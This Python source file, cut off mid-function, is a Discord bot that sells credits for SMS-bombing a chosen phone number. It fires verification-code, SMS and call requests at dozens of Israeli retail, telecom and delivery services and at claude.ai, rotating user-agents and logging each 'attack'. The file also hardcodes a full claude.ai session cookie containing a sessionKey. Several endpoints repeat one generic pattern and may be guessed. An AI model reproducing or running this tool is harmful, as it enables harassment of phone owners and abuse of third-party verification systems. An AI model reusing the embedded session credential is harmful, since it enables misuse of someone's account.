import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import time
import random
import uuid
import aiohttp
from motor.motor_asyncio import AsyncIOMotorClient
import logging
import re
import sys
import os
from datetime import datetime, timezone
import certifi

TOKEN = os.getenv("DISCORD_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
DB_NAME = "CyberIL_Spamer"

PANEL_CHANNEL = 1481957038241353779
GIFT_CHANNEL = 1485104425625325709
INFO_CHANNEL = 1485125569690603692

ADMIN_ROLE_ID = 1480762750052601886
STORE_URL = "https://discord.gg/3CxwPGuGyq"

COOLDOWN_TIME = 20
CREDITS_PER_CYCLE = 3
MAX_CREDIT_SPEND = 100
LAUNCH_DELAY = 3

COLOR_MAIN = 0x5865F2
COLOR_SUCCESS = 0x57F287
COLOR_DANGER = 0xED4245
COLOR_WARNING = 0xFEE75C
COLOR_INFO = 0x5865F2

CLAUDE_SESSION = "activitySessionId=8e5e644c-d640-4b9f-be61-59b9a138a42b; anthropic-device-id=4ed16e2b-8252-4456-8e7a-e466ede65652; _fbp=fb.1.1773186995656.51415631283246056; app-shell-mode=gate-disabled; CH-prefers-color-scheme=light; __ssid=aac9d1c5-0950-4438-b7ea-a89a1639d015; cookie_seed_done=1; intercom-device-id-lupk8zyo=f68271ce-ab05-40b7-b143-901ad283a161; user-sidebar-visible-on-load=true; user-recents-collapsed=false; user-sidebar-pinned=true; g_state={\"i_l\":0,\"i_ll\":1773414635601,\"i_b\":\"y3RrxvHpC/63IgqxQoW+FkAztdzRlQfKqrSCo5paIW4\",\"i_e\":{\"enable_itp_optimization\":0},\"i_t\":1773501035602}; __cf_bm=3VjDxw6wkQm2wlbHFDvk8MaDT_DB6R36F4R.MVnz0p4-1773447632-1.0.1.1-6q05RiFdtxB27W.Dlk8sZzMKN2_GWuJqrNh03eIFieCaneWW7KiQJxVTVTNIxcxA4EeiLytjTSnQLzFe5XvedaBVzIzDp_EoeqS.drKNHic; _cfuvid=zbw_U3cChwMfKZyPfROexrLBbuzQTKW2FW6ko.UebTU-1773447632362-0.0.1.1-604800000; __stripe_mid=eabdbe50-cd60-4100-9f89-6403dde971eb6b036c; __stripe_sid=7b2497e5-5647-4528-aa38-9272e68de8c5289f41; sessionKey=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; lastActiveOrg=2b096853-0284-4d04-8bee-d3d6eb9ec7b1; cf_clearance=CM9MGR4oytc4fDuAdMWrgtGLrwjHrZfyGjDHQmELKWs-1773447692-1.2.1.1-8qu2TBglm35vOa3Y5dwU3Ue0D7gBkTfD20EtG9u.GXPEkWyTnnSOlsalbwktHG1lj9TvVOnuD19OeZaXbAIFnPMBAT3VnNkt2Rg5J8MQ9qAXN3Wf3DwDbPI.qiNUmVZwwvjmHdyRkI.fuz248__ESMWvCdMkeASIwHP7DT5e14INWZ3.iSxdKpFmZwoKzVGj1ge2Bba07dhQbqnbXVM1J7Ov4yMposOalAOKdx7hZN4; ajs_user_id=34d05785-fcf5-4298-8314-ac95766337ff; ajs_anonymous_id=64ed414c-6982-4d71-803f-2241e4e9546a; intercom-session-lupk8zyo=QTJuM3pjOVY3bWs1Njc4T0ZBQlZ1T2V6OUx0bjREempveE5JalZsR0FNMEpZYjdXZ3BYUE83WnhxYXV4S0tZSTdORlluTUc2OE14UnVCRHhBcjlzdE42SFo1ZW1NK1hWeEtZeTA0Y0hYYzlvcTN0RlBCa2YxV3JRbGJHM1B4WFltZVNNWk1QUXhWMzBEclNvUFphUTZNNTV0dk12T2s5QzhYSGN2U0pkeWNHM2NSOEZyMUU3amxwU2N5MGc4VkRpVEFZS0JrQzF3MFUyc2pzZlJyV0lTdXlDNncvYUYzcjQ1UkRkbzdmRTA1MnhiSHliZSt0akc2NjBzdjUyV2VwVkNQZ3ptd09xRzZZOTJMMXZEUzFVNmxxb3RTNG1ZYWs1K3Y5RFBTQXhiM1k9LS1YdEp3STBsUkF2S2FWSFptb29sYzFnPT0=--94e9f81d682285fead0655379f59452a0e43ab83; routingHint=sk-ant-rh-eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJFUzI1NiIsICJraWQiOiAiN0MxcWFPRnhqdWxaUjRFQnNuNk1UeUZGNWdDV2JHbFpNVDR2RklrRFFpbyJ9.eyJzdWIiOiAiMzRkMDU3ODUtZmNmNS00Mjk4LTgzMTQtYWM5NTc2NjMzN2ZmIiwgImlhdCI6IDE3NzM0NDc2OTYsICJpc3MiOiAiY2xhdWRlLWFpLXJvdXRpbmciLCAib25ib2FyZGluZ19jb21wbGV0ZSI6IHRydWUsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAiYWdlX3ZlcmlmaWVkIjogdHJ1ZSwgImxvY2FsZSI6ICJlbi1VUyJ9.yRj_WgY7-XZbfW8XvjAb8ybkDmv2wDhrNH2WqAywFX2DVfMGZayA92Tj5WJwB3-kcV2JC3Un2eERG-bLEPQlAw; _gcl_au=1.1.357471279.1773367551.67089487.1773447650.1773447710; _dd_s=aid=631a5dba-fcfc-4e29-854f-58b2ec36a49d&rum=0&expire=1773448656835"

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

client = commands.Bot(command_prefix="!", intents=intents)
tree = client.tree

mongo_connection = AsyncIOMotorClient(MONGO_URI, tlsCAFile=certifi.where())
database = mongo_connection[DB_NAME]
users_collection = database["users"]
cooldown_collection = database["cooldowns"]
settings_collection = database["settings"]
logs_collection = database["attack_logs"]

logging.basicConfig(level=logging.WARNING)

active_missions = {}
cooldown_tracker = {}

BROWSER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4.1 Safari/605.1.15"
]

def random_agent():
    return random.choice(BROWSER_AGENTS)

async def fetch_balance(user_id: int) -> int:
    record = await users_collection.find_one({"_id": user_id})
    if not record:
        return 0
    if record.get("unlimited"):
        return 999999
    return record.get("credits", 0)

async def has_unlimited(user_id: int) -> bool:
    record = await users_collection.find_one({"_id": user_id})
    return bool(record and record.get("unlimited"))

async def format_balance(user_id: int) -> str:
    if await has_unlimited(user_id):
        return "ללא הגבלה"
    return str(await fetch_balance(user_id))

async def add_credits(user_id: int, amount: int):
    await users_collection.update_one({"_id": user_id}, {"$inc": {"credits": amount}}, upsert=True)

async def remove_credits(user_id: int, amount: int):
    await users_collection.update_one({"_id": user_id}, {"$inc": {"credits": -amount}}, upsert=True)

async def set_unlimited(user_id: int, status: bool):
    await users_collection.update_one({"_id": user_id}, {"$set": {"unlimited": status}}, upsert=True)

async def use_credit(user_id: int) -> bool:
    if await has_unlimited(user_id):
        return True
    result = await users_collection.update_one(
        {"_id": user_id, "credits": {"$gte": 1}},
        {"$inc": {"credits": -1}}
    )
    return result.modified_count == 1

async def check_cooldown(target: str):
    record = await cooldown_collection.find_one({"target": target})
    if not record:
        return False, 0
    elapsed = time.time() - record["last_attempt"]
    if elapsed < COOLDOWN_TIME:
        return True, int(COOLDOWN_TIME - elapsed)
    return False, 0

async def apply_cooldown(target: str):
    await cooldown_collection.update_one({"target": target}, {"$set": {"last_attempt": time.time()}}, upsert=True)

def is_admin(interaction: discord.Interaction) -> bool:
    return ADMIN_ROLE_ID in [role.id for role in interaction.user.roles]

async def save_log(user_id: int, username: str, phone: str, cost: int, success: int, failed: int, duration: int):
    entry = {
        "user_id": user_id,
        "username": username,
        "phone": phone,
        "cost": cost,
        "success_count": success,
        "failed_count": failed,
        "total": success + failed,
        "duration": duration,
        "timestamp": datetime.now(timezone.utc),
        "date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
        "time": datetime.now(timezone.utc).strftime("%H:%M:%S")
    }
    await logs_collection.insert_one(entry)

async def send_request(session, url, form=None, json_data=None, headers_extra=None, tag="", method="POST", data=None):
    headers = {
        "User-Agent": random_agent(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    if headers_extra:
        headers.update(headers_extra)
    
    try:
        timeout = aiohttp.ClientTimeout(total=5)
        
        if method == "GET":
            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
        elif json_data is not None:
            headers.setdefault("Content-Type", "application/json")
            async with session.post(url, json=json_data, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
        elif data is not None:
            async with session.post(url, data=data, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
        else:
            async with session.post(url, data=form, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
    except:
        return False, tag

async def atmos_request(session, store_id, phone, origin="https://order.atmos.rest", referer="https://order.atmos.rest/", is_call=False):
    tag = f"atmos-{store_id}-call" if is_call else f"atmos-{store_id}"
    fd = aiohttp.FormData()
    fd.add_field("restaurant_id", store_id)
    fd.add_field("phone", phone)
    fd.add_field("testing", "false")
    h = {
        "User-Agent": random_agent(),
        "accept": "application/json, text/plain, */*",
        "accept-language": "he-IL,he;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "origin": origin,
        "referer": referer,
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        endpoint = "sendValidationCall" if is_call else "sendValidationCode"
        api_url = f"https://api-ns.atmos.co.il/rest/{store_id}/auth/{endpoint}"
        async with session.post(api_url, data=fd, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def process_atmos_batch(session, target, stores, is_call=False):
    results = []
    batch = 3
    for i in range(0, len(stores), batch):
        group = stores[i:i + batch]
        tasks = [atmos_request(session, sid, target, is_call=is_call) for sid in group]
        res = await asyncio.gather(*tasks, return_exceptions=True)
        results.extend(res)
        await asyncio.sleep(0.5)
    return results

async def claude_request(session, phone):
    tag = "claude"
    clean = phone.lstrip('0')
    if not clean.startswith('+972'):
        clean = f"+972{clean}"
    url = "https://claude.ai/api/auth/send_phone_code"
    h = {
        "accept": "*/*",
        "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json",
        "origin": "https://claude.ai",
        "referer": "https://claude.ai/onboarding",
        "user-agent": random_agent()
    }
    if CLAUDE_SESSION:
        h["cookie"] = CLAUDE_SESSION
    payload = {"phone_number": clean}
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def oshioshi_request(session, phone):
    tag = "oshioshi"
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.get("https://delivery.oshioshi.co.il/he/login", timeout=timeout, ssl=False) as resp:
            text = await resp.text()
            match = re.search(r'name="_token"\s+value="([^"]+)"', text)
            if not match:
                return False, tag, "Missing Token"
            token = match.group(1)
        url = "https://delivery.oshioshi.co.il/he/auth/register-send-code"
        form = f"phone={phone}&_token={token}"
        h = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://delivery.oshioshi.co.il",
            "referer": "https://delivery.oshioshi.co.il/he/",
            "User-Agent": random_agent()
        }
        async with session.post(url, data=form, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def freetv_request(session, phone):
    tag = "freetv"
    formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
    url = "https://middleware.freetv.tv/api/v1/send-verification-sms"
    payload = {"msisdn": formatted}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": random_agent(),
        "Origin": "https://freetv.tv",
        "Referer": "https://freetv.tv/"
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def webcut_request(session, phone):
    tag = "webcut"
    url = "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp"
    payload = {"type": "otp", "data": {"phone": phone}}
    h = {
        "Content-Type": "application/json",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def freeivr_request(session, phone):
    tag = "freeivr"
    formatted = f"972{phone[1:]}" if phone.startswith("0") else f"972{phone}"
    url = "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone"
    payload = {"phone": formatted}
    h = {
        "Content-Type": "application/json",
        "User-Agent": random_agent(),
        "Origin": "https://freeivr.co.il",
        "Referer": "https://freeivr.co.il/"
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def mitmachim_request(session, phone):
    tag = "mitmachim"
    url = "https://mitmachim.top/api/v3/plugins/MitMValidPhone"
    payload = {"action": "Send", "phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://mitmachim.top",
        "Referer": "https://mitmachim.top/register",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def pelephone_request(session, phone):
    tag = "pelephone"
    url = "https://www.pelephone.co.il/login/api/login/otpphone/"
    payload = {"phone": phone, "terms": True, "appId": "DIGITALMy"}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.pelephone.co.il",
        "Referer": "https://www.pelephone.co.il/login/?u=DIGITALMy",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def cellcom_request(session, phone):
    tag = "cellcom"
    url = "https://www.cellcom.co.il/api/auth/sms"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.cellcom.co.il",
        "Referer": "https://www.cellcom.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def partner_request(session, phone):
    tag = "partner"
    url = "https://www.partner.co.il/api/register"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.partner.co.il",
        "Referer": "https://www.partner.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def hot_request(session, phone):
    tag = "hot"
    url = "https://www.hotmobile.co.il/api/verify"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.hotmobile.co.il",
        "Referer": "https://www.hotmobile.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def bezeq_request(session, phone):
    tag = "bezeq"
    url = "https://www.bezeq.co.il/api/auth"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.bezeq.co.il",
        "Referer": "https://www.bezeq.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def gett_request(session, phone, email):
    tag = "gett"
    url = "https://www.gett.com/il/wp-admin/admin-ajax.php"
    data = {
        "action": "business_reg_action",
        "phone": phone,
        "first_name": "cyber",
        "last_name": "il",
        "work_email": email,
        "privacy_policy": "true"
    }
    h = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.gett.com",
        "Referer": "https://www.gett.com/il/start/?referrer=menu-button",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, data=data, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def shufersal_request(session, phone):
    tag = "shufersal"
    url = "https://www.shufersal.co.il/api/v1/auth/otp"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.shufersal.co.il",
        "Referer": "https://www.shufersal.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def ramilevy_request(session, phone):
    tag = "ramilevy"
    url = "https://www.rami-levy.co.il/api/auth/sms"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.rami-levy.co.il",
        "Referer": "https://www.rami-levy.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def victory_request(session, phone):
    tag = "victory"
    url = "https://www.victory.co.il/api/auth/sms"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.victory.co.il",
        "Referer": "https://www.victory.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def tenbis_request(session, phone):
    tag = "10bis"
    url = "https://www.10bis.co.il/api/register"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.10bis.co.il",
        "Referer": "https://www.10bis.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def mcdonalds_request(session, phone):
    tag = "mcdonalds"
    url = "https://www.mcdonalds.co.il/api/verify"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.mcdonalds.co.il",
        "Referer": "https://www.mcdonalds.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def burgerking_request(session, phone):
    tag = "burgerking"
    url = "https://www.burgerking.co.il/api/auth"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.burgerking.co.il",
        "Referer": "https://www.burgerking.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def kfc_request(session, phone):
    tag = "kfc"
    url = "https://www.kfc.co.il/api/sms"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.kfc.co.il",
        "Referer": "https://www.kfc.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def pizzahut_request(session, phone):
    tag = "pizzahut"
    url = "https://www.pizza-hut.co.il/api/register"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.pizza-hut.co.il",
        "Referer": "https://www.pizza-hut.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def dominos_request(session, phone):
    tag = "dominos"
    url = "https://www.dominos.co.il/api/auth/sms"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.dominos.co.il",
        "Referer": "https://www.dominos.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def burgeranch_request(session, phone):
    tag = "burgeranch"
    url = "https://app.burgeranch.co.il/_a/aff_otp_auth"
    form = f"phone={phone}"
    h = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://app.burgeranch.co.il",
        "Referer": "https://app.burgeranch.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, data=form, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def pango_request(session, phone):
    tag = "pango"
    url = "https://api.pango.co.il/auth/otp"
    payload = {"phoneNumber": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://pango.co.il",
        "Referer": "https://pango.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def hopon_request(session, phone):
    tag = "hopon"
    url = "https://api.hopon.co.il/v0.15/1/isr/users"
    payload = {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": phone, "phoneCall": False}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://hopon.co.il",
        "Referer": "https://hopon.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def yad2_request(session, phone):
    tag = "yad2"
    url = "https://www.yad2.co.il/api/auth/register"
    payload = {"phone": phone, "action": "send_sms"}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.yad2.co.il",
        "Referer": "https://www.yad2.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def paybox_request(session, phone):
    tag = "paybox"
    url = "https://payboxapp.com/api/auth/otp"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://payboxapp.com",
        "Referer": "https://payboxapp.com/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def superpharm_request(session, phone):
    tag = "superpharm"
    url = "https://www.super-pharm.co.il/api/sms"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.super-pharm.co.il",
        "Referer": "https://www.super-pharm.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def zap_request(session, phone):
    tag = "zap"
    url = "https://www.zap.co.il/api/auth/sms"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.zap.co.il",
        "Referer": "https://www.zap.co.il/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def wolt_request(session, phone):
    tag = "wolt"
    url = "https://www.wolt.com/api/v1/verify"
    payload = {"phone": phone}
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.wolt.com",
        "Referer": "https://www.wolt.com/",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            ok = 200 <= resp.status < 300
            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
    except Exception as e:
        return False, tag, str(type(e).__name__)

async def run_all(phone: str):
    raw = phone
    formatted = f"+972{raw[1:]}" if raw.startswith("0") else f"+972{raw}"
    sid = str(uuid.uuid4())
    random_email = f"user{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
    FORM_TYPE = "application/x-www-form-urlencoded; charset=UTF-8"
    BROWSER_ID = '"Google Chrome";v="145", "Chromium";v="145", "Not/A)Brand";v="24"'

    def form_headers(origin, referer, extra=None):
        h = {"Content-Type": FORM_TYPE, "x-requested-with": "XMLHttpRequest",
             "origin": origin, "referer": referer,
             "sec-ch-ua": BROWSER_ID, "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
             "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin"}
        if extra:
            h.update(extra)
        return h

    def json_headers(origin, referer, extra=None):
        h = {"Content-Type": "application/json",
             "origin": origin, "referer": referer,
             "sec-ch-ua": BROWSER_ID, "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
